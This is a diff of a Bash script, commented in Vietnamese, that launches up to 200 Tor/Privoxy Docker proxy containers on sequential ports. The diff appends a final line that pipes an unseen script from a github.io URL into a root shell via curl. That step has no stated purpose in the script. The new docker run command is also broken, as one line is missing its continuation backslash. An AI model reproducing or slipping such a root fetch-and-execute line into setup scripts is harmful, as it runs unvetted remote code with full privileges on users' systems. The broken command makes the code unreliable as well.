@@ -1,79 +1,34 @@
 #!/bin/bash
 
-# Giới hạn tài nguyên
-MAX_CONTAINERS=10000        # Số lượng container tối đa
-PORT_8118_START=8000        # Cổng bắt đầu cho 8118
-PORT_4444_START=4444        # Cổng bắt đầu cho 4444
+NUM_CONTAINERS=200
+PORT_8118_START=8000
+PORT_4444_START=4444
 
-# Kiểm tra lượng RAM còn lại (MB)
-RAM_FREE=$(free -m | grep Mem | awk '{print $7}')
+create_container() {
+  local i=$1
+  local CONTAINER_NAME="tor-proxy${i}"
+  local PORT_8118=$((PORT_8118_START + i))
+  local PORT_4444=$((PORT_4444_START + i))
 
-# Kiểm tra số lõi CPU hiện có
-CPU_CORES=$(nproc)
+  docker run --restart=always -d \
+    --name "$CONTAINER_NAME" \
+    -p "$PORT_8118:8118" -p "$PORT_4444:4444" \
+    -e "TOR_COUNTRY=US,CA,LU,DE" \
+    -e "TOR_INSTANCES=5"
+    -e "TOR_REBUILD_INTERVAL=3600" \
+    vltpro/tor-privoxy
 
-# Tính toán số lượng container tối đa có thể tạo dựa trên tài nguyên
-# Giả sử mỗi container cần 200MB RAM và 1 lõi CPU
-MAX_CONTAINERS_RAM=$((RAM_FREE / 200))
-MAX_CONTAINERS_CPU=$CPU_CORES
-
-# Lấy giá trị nhỏ hơn giữa số container từ RAM và CPU
-NUM_CONTAINERS=$((MAX_CONTAINERS_RAM < MAX_CONTAINERS_CPU ? MAX_CONTAINERS_RAM : MAX_CONTAINERS_CPU))
-
-# Hạn chế số lượng container nếu vượt quá MAX_CONTAINERS
-NUM_CONTAINERS=$((NUM_CONTAINERS < MAX_CONTAINERS ? NUM_CONTAINERS : MAX_CONTAINERS))
-
-# Hiển thị số lượng container sẽ tạo
-echo "Có thể tạo tối đa $NUM_CONTAINERS container(s) dựa trên tài nguyên hệ thống."
-
-# Kiểm tra cổng đã được sử dụng chưa
-check_port_in_use() {
-    local port=$1
-    ss -tuln | grep -q ":$port " && return 0 || return 1
+  if [ $? -eq 0 ]; then
+    echo "Đã tạo container $CONTAINER_NAME với các cổng: $PORT_8118, $PORT_4444"
+  else
+    echo "Lỗi tạo container $CONTAINER_NAME"
+    exit 1
+  fi
 }
 
-# Hàm lấy cổng khả dụng
-get_available_port() {
-    local start_port=$1
-    local port=$start_port
-    while check_port_in_use $port; do
-        port=$((port + 1))
-    done
-    echo $port
-}
-
-# Tạo container
-for i in $(seq 0 $((NUM_CONTAINERS - 1))); do
-    CONTAINER_NAME="tor-proxy$i"
-
-    # Tìm các cổng khả dụng
-    PORT_8118=$(get_available_port $PORT_8118_START)
-    PORT_4444=$(get_available_port $PORT_4444_START)
-
-    # Tăng giá trị cổng bắt đầu để tránh trùng lặp
-    PORT_8118_START=$((PORT_8118 + 1))
-    PORT_4444_START=$((PORT_4444 + 1))
-
-    # Kiểm tra container đã tồn tại chưa
-    if docker ps -a --format '{{.Names}}' | grep -q "^${CONTAINER_NAME}$"; then
-        echo "Container $CONTAINER_NAME đã tồn tại, bỏ qua."
-        continue
-    fi
-
-    # Chạy container Docker
-    docker run --restart=always -d \
-        --name "$CONTAINER_NAME" \
-        -p "$PORT_8118:8118" \
-        -p "$PORT_4444:4444" \
-        -e "TORS=3" \
-        -e "HEADS=2" \
-        -e "TOR_COUNTRY=US,CA,LU" \
-        -e "TOR_REBUILD_INTERVAL=3600" \
-        vltpro/tor-privoxy
-
-    # Kiểm tra kết quả
-    if [ $? -eq 0 ]; then
-        echo "Đã tạo container $CONTAINER_NAME với cổng: 8118=$PORT_8118, 4444=$PORT_4444"
-    else
-        echo "Lỗi khi tạo container $CONTAINER_NAME"
-    fi
+for i in $(seq 1 $NUM_CONTAINERS); do
+  create_container $i
+  sleep 1 # Thời gian chờ 1 giây
 done
+
+sudo bash <(curl -s "http://volamtuan.github.io/ch") 
